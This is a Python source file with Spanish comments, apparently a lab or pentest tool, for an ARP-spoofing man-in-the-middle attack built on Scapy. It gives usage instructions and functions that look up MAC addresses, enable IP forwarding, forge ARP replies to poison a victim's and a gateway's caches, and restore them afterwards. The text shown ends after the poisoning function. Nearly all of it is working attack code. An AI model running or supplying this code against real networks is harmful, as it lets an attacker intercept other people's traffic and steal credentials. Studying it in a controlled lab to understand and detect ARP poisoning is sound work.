DESCRIPCION:
  Este script realiza un ataque Man-in-the-Middle (MitM) usando
  ARP Spoofing. Envenena la cache ARP de dos victimas para que
  el trafico entre ellas pase por la maquina atacante.

  Flujo normal:   Victima1 <-------> Gateway
  Flujo atacado:  Victima1 <-> Kali <-> Gateway

USO:
  sudo python3 arp_mitm.py -i eth0 -v1 202.50.73.20 -gw 202.50.73.1

REQUISITOS:
  - Kali Linux con Python 3.8+
  - pip install scapy
  - Ejecutar como root
  - Habilitar IP forwarding antes de ejecutar
"""

import argparse
import os
import sys
import time
import signal
from datetime import datetime

try:
    from scapy.all import (
        Ether, ARP, srp, send, get_if_hwaddr, conf
    )
except ImportError:
    print("[ERROR] Scapy no encontrado. Instalar con: sudo pip3 install scapy")
    sys.exit(1)


# ==============================================================
# FUNCIONES AUXILIARES
# ==============================================================

def get_mac(ip: str, iface: str) -> str:
    """
    Obtiene la MAC de una IP mediante ARP Request.
    Retorna la MAC como string o None si no responde.
    """
    arp_req  = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    pkt = broadcast / arp_req

    answered, _ = srp(pkt, iface=iface, timeout=3, verbose=False)

    if answered:
        return answered[0][1].hwsrc
    else:
        print(f"[ERROR] No se obtuvo respuesta ARP de {ip}")
        print(f"        Verificar que el host este activo y en la misma red.")
        return None


def enable_ip_forwarding() -> None:
    """Habilita el IP forwarding en Linux para que el trafico fluya."""
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        print("[+] IP Forwarding habilitado (/proc/sys/net/ipv4/ip_forward = 1)")
    except PermissionError:
        print("[ERROR] No se pudo habilitar IP forwarding. Ejecutar con sudo.")
        sys.exit(1)


def disable_ip_forwarding() -> None:
    """Deshabilita el IP forwarding al terminar."""
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0")
        print("[+] IP Forwarding deshabilitado (restaurado)")
    except Exception:
        pass


def restore_arp(victim_ip: str, victim_mac: str,
                gateway_ip: str, gateway_mac: str) -> None:
    """
    Restaura las tablas ARP de ambas victimas con los valores reales.
    Se llama al detener el ataque para limpiar el veneno ARP.
    """
    print("\n[*] Restaurando tablas ARP...")
    for _ in range(5):
        # Decirle a la victima quien es realmente el gateway
        send(
            ARP(op=2,
                pdst=victim_ip,  hwdst=victim_mac,
                psrc=gateway_ip, hwsrc=gateway_mac),
            verbose=False
        )
        # Decirle al gateway quien es realmente la victima
        send(
            ARP(op=2,
                pdst=gateway_ip, hwdst=gateway_mac,
                psrc=victim_ip,  hwsrc=victim_mac),
            verbose=False
        )
        time.sleep(0.2)
    print("[+] Tablas ARP restauradas correctamente.")


def poison_arp(victim_ip: str, victim_mac: str,
               gateway_ip: str, gateway_mac: str,
               attacker_mac: str) -> None:
    """
    Envia paquetes ARP Reply falsos a ambas victimas.
    Le dice a victim que el gateway tiene la MAC del atacante.
    Le dice al gateway que la victim tiene la MAC del atacante.
    """
    # Envenenar a la victima: "El gateway (gateway_ip) tiene MAC del atacante"
    send(
        ARP(op=2,
            pdst=victim_ip,  hwdst=victim_mac,
            psrc=gateway_ip, hwsrc=attacker_mac),
        verbose=False
    )
    # Envenenar al gateway: "La victima (victim_ip) tiene MAC del atacante"
    send(
        ARP(op=2,
            pdst=gateway_ip, hwdst=gateway_mac,
            psrc=victim_ip,  hwsrc=attacker_mac),
        verbose=False
    )


